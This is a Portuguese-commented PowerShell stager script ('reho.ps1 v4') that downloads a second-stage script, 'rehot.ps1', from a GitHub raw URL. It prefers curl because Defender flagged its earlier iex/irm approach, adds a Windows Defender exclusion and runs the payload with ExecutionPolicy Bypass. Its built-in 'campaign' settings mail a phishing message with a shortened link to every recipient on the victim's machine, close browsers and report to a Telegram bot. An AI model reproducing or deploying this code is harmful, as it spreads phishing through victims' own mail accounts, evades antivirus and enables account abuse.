# reho.ps1 v4 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
# O que muda aqui NUNCA quebra o one-liner: a campanha mora em reho.config.json
# (versionado, baixado junto com rehot.ps1). Este runner e 100% fixo:
#   1. cria %LOCALAPPDATA%\rehot
#   2. baixa rehot.ps1 + reho.config.json (2 engines por arquivo: iwr -> curl fallback;
#      canary em cada arquivo; config ausente/ilegivel cai em default sem abortar)
#   3. unblock + exclusao do Defender (a exclusao so aplica em shell admin; sem admin segue sem ela)
#   4. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
# Diagnostico: linhas [reho ...]; FALHA sai motivo + exit code do estagio (1..9).
# Nao existe segredo neste script: tokens do bot moram no rehot.config.json local (gitignored).

$ErrorActionPreference = 'Stop'
$base = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main'
$d = Join-Path $env:LOCALAPPDATA 'rehot'
$t = Join-Path $d 'rehot.ps1'
$c = Join-Path $d 'reho.config.json'

function RhoFail([int]$stage, [string]$msg) {
    Write-Output ('[reho FALHA estagio-' + $stage + '] ' + $msg)
    exit $stage
}

if (-not (Test-Path $d)) {
    try {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
    } catch {
        RhoFail 1 ('pasta nao criada: ' + $_.Exception.Message)
    }
}
Write-Output '[reho] ok estagio-1 pasta ' + $d

foreach ($old in @($t, $c)) {
    if (Test-Path $old) { Remove-Item $old -Force -ErrorAction SilentlyContinue }
}

function Get-Dl([string]$name, [string]$dest) {
    # engine 1: curl.exe nativo (TLS do Windows; mais discreto que iwr - o iex/irm do
    # uml era o que o Defender acusava; aqui e no uml curl e o motor principal)
    try {
        $tmp = $dest + '.dl'
        & curl.exe -sSL -f --connect-timeout 30 -o $tmp ($base + '/' + $name) 2>$null
        if (Test-Path $tmp) { Move-Item $tmp $dest -Force }
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
    } catch { }
    # (iwr ja foi o engine 1 na v4.0; agora e fallback - apenas se o alvo nao tem curl.exe)
    # So avanca se a chamada nao lancar E arquivo existe com tamanho > 0
    # (arquivo parcial de um iwr cortado NUNCA avanca).
    try {
        Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
    } catch { }
    return $false
}

$cfgOk = $false
if (Get-Dl 'reho.config.json' $c) {
    if ((Get-Content $c -Raw).Contains('recipients')) { $cfgOk = $true }
    else { Remove-Item $c -Force -ErrorAction SilentlyContinue }
}
if ($cfgOk) {
    Write-Output ('[reho] ok estagio-2 reho.config.json (' + (Get-Item $c).Length + ' bytes)')
} else {
    Write-Output '[reho] estagio-2 reho.config.json ausente/ilegivel -> segue com defaults do runner (mesma campanha de v3)'
}
if (-not (Get-Dl 'rehot.ps1' $t)) {
    RhoFail 2 'download do rehot.ps1 nao completou nos 2 engines (404/403/rede/bloqueio; confira se o repo stl ta atualizado)'
}
if (-not ((Get-Content $t -Raw).Contains('Send-OWAMsg'))) {
    RhoFail 2 'canary rehot.ps1 ausente: payload baixado nao e o rehot esperado (resposta de erro ou repo divergente)'
}
# guard anti-truncamento: canary presente nao prova script inteiro (download cortado
# pode conter o canary e morrer no meio do corpo). Parse completo antes de executar.
$toks = $null; $perr = $null
[void][System.Management.Automation.Language.Parser]::ParseInput((Get-Content $t -Raw), [ref]$toks, [ref]$perr)
if ($null -ne $perr -and $perr.Count -gt 0) {
    RhoFail 2 ('rehot.ps1 baixado nao parseia (' + $perr.Count + ' erros; arquivo parcial ou corrompido)')
}
Write-Output ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes)')

try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
Write-Output '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'

# defaults (fallback quando reho.config.json nao existe; mesmo contrato de campanha de v3)
$dv = @{
    recipients     = 'all'
    close_browsers = $true
    subject        = 'Retorno Documento Solicitado'
    body           = 'Conforme solicitado aqui est' + [char]225 + ' o documento que voc' + [char]234 + ' me pediu https://encurtador.com.br/YYaR'
    telegram       = $true
    max_messages   = 0
    self_delete    = $false
    dry_run        = $false
    TgTok          = ''
    TelegramChatId = ''
    ListaTok       = ''
    ListaChatId    = ''
}
$rec = [string]$dv.recipients
$close = [bool]$dv.close_browsers
$subject = [string]$dv.subject
$body = [string]$dv.body
$telegram = [bool]$dv.telegram
$maxMessages = [int]$dv.max_messages
$selfDelete = [bool]$dv.self_delete
$dryRun = [bool]$dv.dry_run
$TgTok = [string]$dv.TgTok
$TelegramChatId = [string]$dv.TelegramChatId
$ListaTok = [string]$dv.ListaTok
$ListaChatId = [string]$dv.ListaChatId
$selfTest = $false
if ($cfgOk) {
    try {
        $j = Get-Content $c -Raw | ConvertFrom-Json
        if ($null -ne $j.recipients) {
            $r = [string]$j.recipients
            if ($r -eq 'all') { $rec = 'all' } else { $rec = $r }
        }
        if ($null -ne $j.close_browsers) { $close = [bool]$j.close_browsers }
        if ($null -ne $j.subject) { $subject = [string]$j.subject }
        if ($null -ne $j.body) { $body = [string]$j.body }
        if ($null -ne $j.telegram) { $telegram = [bool]$j.telegram }
        if ($null -ne $j.max_messages) { $maxMessages = [int]$j.max_messages }
        if ($null -ne $j.self_delete) { $selfDelete = [bool]$j.self_delete }
        if ($null -ne $j.dry_run) { $dryRun = [bool]$j.dry_run }
        if ($null -ne $j.self_test) { $selfTest = [bool]$j.self_test }
        if ($null -ne $j.TgTok) { $TgTok = [string]$j.TgTok }
        if ($null -ne $j.TelegramChatId) { $TelegramChatId = [string]$j.TelegramChatId }
        if ($null -ne $j.ListaTok) { $ListaTok = [string]$j.ListaTok }
        if ($null -ne $j.ListaChatId) { $ListaChatId = [string]$j.ListaChatId }
    } catch {
        Write-Output '[reho] reho.config.json ilegivel -> segue com defaults'
    }
}

$argvs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $t)
if ($selfTest) {
    $argvs += '-SelfTest'
}
if ($close) { $argvs += '-CloseBrowsers' }
if ($rec -eq 'all') { $argvs += '-ToAllRecipients' } else { $argvs += '-SendTo', $rec }
if ($subject) { $argvs += '-Subject', $subject }
if ($body) { $argvs += '-Body', $body }
if (-not $telegram) { $argvs += '-NoTelegram' }
if ($maxMessages -gt 0) { $argvs += '-MaxMessages', ([string]$maxMessages) }
if ($selfDelete) { $argvs += '-SelfDelete' }
if ($dryRun) { $argvs += '-DryRun' }
if ($TgTok) { $argvs += '-TgTok', $TgTok }
if ($TelegramChatId) { $argvs += '-TelegramChatId', $TelegramChatId }
if ($ListaTok) { $argvs += '-ListaTok', $ListaTok }
if ($ListaChatId) { $argvs += '-ListaChatId', $ListaChatId }

# PING REHO_TG_CHECK: com token no config, checa api.telegram.org ANTES da campanha
# (o rehot envia o report via iwr/Invoke-WebRequest; se iwr estiver bloqueado no alvo
# mas curl passar, o PING ainda avisa). 429/401 = chegamos la (token/problema de quota,
# nao de rede). So "nao chegamos" aborta: reporta ao bot local + exit 8.
if ($TgTok -and $TelegramChatId -and $telegram -and (-not $selfTest)) {
    $pingCode = ''
    try {
        $pingCode = [string](& curl.exe -sS -o NUL -w "%{http_code}" --connect-timeout 10 ("https://api.telegram.org/bot" + $TgTok + "/getMe") 2>$null)
    } catch { }
    if ($pingCode -match '^(200|401|429|400)$') {
        Write-Output ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + ')')
    } else {
        $note = '[reho FALHA] PING REHO_TG_CHECK - api.telegram.org INALCANCAVEL neste alvo (HTTP ' + $pingCode + '; iwr/curl bloqueados ou DNS). O email pode ter sido enviado normalmente; o report do Telegram nao chega daqui.'
        $tgPayload = @{ chat_id = $TelegramChatId; text = $note; disable_web_page_preview = $false } | ConvertTo-Json -Compress
        try {
            & curl.exe -sS -o NUL -w "%{http_code}" --connect-timeout 10 -X POST -H "Content-Type: application/json" --data $tgPayload ("https://api.telegram.org/bot" + $TgTok + "/sendMessage") 2>$null | Out-Null
        } catch { }
        RhoFail 8 'PING REHO_TG_CHECK falhou (api.telegram.org unreachable no alvo; report local enviado ao bot)'
    }
}

# log do estagio-4 com tokens mascarados (nao deixa segredo no console/alvo)
$argvsLog = $argvs
if ($TgTok) { $argvsLog = $argvs -replace [regex]::Escape($TgTok), '***' }
if ($ListaTok) { $argvsLog = $argvsLog -replace [regex]::Escape($ListaTok), '***' }
Write-Output ('[reho] estagio-4 exec: ' + ($argvsLog -join ' '))
try {
    & (Join-Path $PSHOME 'powershell.exe') @argvs
    exit $LASTEXITCODE
} catch {
    RhoFail 4 ('execucao falhou: ' + $_.Exception.Message)
}
